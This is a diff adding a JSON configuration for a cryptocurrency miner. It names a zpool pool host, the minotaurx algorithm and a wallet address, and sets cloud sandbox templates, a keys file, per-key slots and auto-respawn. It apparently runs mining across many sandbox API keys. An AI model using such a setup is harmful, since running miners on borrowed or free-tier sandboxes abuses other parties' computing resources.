@@ -1,0 +1,19 @@
+{
+  "mode": "zpool",
+  "template_name": "core-yok7h-t4",
+  "slots_per_key": 20,
+  "cpu_count": 8,
+  "workers_count": 8,
+  "memory_mb": 8192,
+  "sandbox_timeout_seconds": 3000,
+  "duration_minutes": 50,
+  "auto_respawn": true,
+  "algorithm": "cwm_minotaurx",
+  "host": "minotaurx.sea.mine.zpool.ca",
+  "port": 7019,
+  "worker_wallet": "DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM",
+  "password": "c=DGB",
+  "keys_file": "list.txt",
+  "concurrency_limit": 3,
+  "spawn_delay_seconds": 1.0
+}
